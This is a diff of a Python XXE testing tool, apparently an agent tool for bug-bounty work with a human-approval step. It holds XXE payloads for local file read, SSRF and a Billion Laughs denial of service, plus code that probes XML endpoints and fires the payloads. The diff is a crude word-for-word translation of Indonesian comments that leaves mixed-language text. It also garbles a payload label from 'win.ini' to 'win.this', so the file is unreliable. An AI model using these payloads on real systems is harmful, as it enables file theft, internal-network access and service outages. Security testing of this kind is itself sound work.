@@ -45,7 +45,7 @@ XXE_PAYLOADS = [
 ]>
 <root><data>&xxe;</data></root>""",
         ["[fonts]", "[extensions]", "for 16-bit"],
-        "Classic XXE — Windows win.ini read",
+        "Classic XXE — Windows win.this read",
         "Critical"
     ),
     # SSRF via XXE
@@ -68,7 +68,7 @@ XXE_PAYLOADS = [
   <!ENTITY lol3 "&lol2;&lol2;&lol2;">
 ]>
 <root>&lol3;</root>""",
-        [],  # Cek dari response time / error
+        [],  # Cek from response time / error
         "Billion Laughs (DoS)",
         "High"
     ),
@@ -89,7 +89,7 @@ XXE_PAYLOADS = [
 
 
 def _find_xml_endpoints(base_url: str) -> list:
-    """Cari endpoint yang mungkin nerima XML."""
+    """Cari endpoint that mungkin nerima XML."""
     xml_paths = [
         "/api/xml", "/xml", "/upload", "/import",
         "/api/import", "/api/upload", "/api/v1/xml",
@@ -108,7 +108,7 @@ def _find_xml_endpoints(base_url: str) -> list:
             # 200, 400, 405 = endpoint exist
             if resp.status_code in (200, 400, 405, 415):
                 content_type = resp.headers.get("Content-Type", "").lower()
-                # Prioritasin yang return XML atau JSON (API endpoint)
+                # Prioritasin that return XML atau JSON (API endpoint)
                 if any(ct in content_type for ct in ["xml", "json", "text"]):
                     found.append(url)
 
@@ -119,7 +119,7 @@ def _find_xml_endpoints(base_url: str) -> list:
 
 
 def _test_xxe_on_endpoint(url: str) -> list:
-    """Test XXE pada satu endpoint."""
+    """Test XXE on satu endpoint."""
     findings = []
     domain = _domain_of(url)
     auth_kwargs = get_auth_kwargs(domain)
@@ -164,7 +164,7 @@ def _test_xxe_on_endpoint(url: str) -> list:
                     exec_logger.add_log("XXE Tester", "WARNING", f"XXE found: {payload_name} on {url}")
                     break
 
-            # Buat Billion Laughs — cek dari error atau timeout
+            # Buat Billion Laughs — cek from error atau timeout
             elif "Billion Laughs" in payload_name:
                 if resp.status_code in (500, 503) or "memory" in response_text.lower():
                     findings.append({
@@ -176,7 +176,7 @@ def _test_xxe_on_endpoint(url: str) -> list:
                     })
 
         except requests.Timeout:
-            # Timeout juga bisa indikasi Billion Laughs success
+            # Timeout juga can indikasi Billion Laughs success
             if "Billion Laughs" in payload_name:
                 findings.append({
                     "endpoint": url,
@@ -194,8 +194,8 @@ def _test_xxe_on_endpoint(url: str) -> list:
 @tool("xxe_tester")
 def xxe_tester(target_url: str) -> str:
     """
-    Testing XML External Entity (XXE) injection pada target.
-    XXE bisa berujung ke file read, SSRF, atau DoS — termasuk
+    Testing XML External Entity (XXE) injection on target.
+    XXE can berujung ke file read, SSRF, atau DoS — termasuk
     vulnerability critical di bug bounty.
     
     Args:
@@ -204,15 +204,15 @@ def xxe_tester(target_url: str) -> str:
     if check_cancelled(exec_logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."
 
     approved = require_approval(
-        action=f"XXE injection testing pada {target_url}",
-        context="Kirim XML payload dengan external entity ke endpoint yang nerima XML input",
+        action=f"XXE injection testing on {target_url}",
+        context="Kirim XML payload with external entity ke endpoint that nerima XML input",
         risk="medium",
         exec_logger=exec_logger,
     )
     if not approved:
         return "TEST DIBATALKAN: human-in-the-loop approval rejected atau timeout."
 
-    exec_logger.add_log("XXE Tester", "START", f"Starting XXE testing pada {target_url}")
+    exec_logger.add_log("XXE Tester", "START", f"Starting XXE testing on {target_url}")
 
     # Step 1: Find XML endpoints
     exec_logger.add_log("XXE Tester", "PROCESSING", "Searching XML-accepting endpoints")
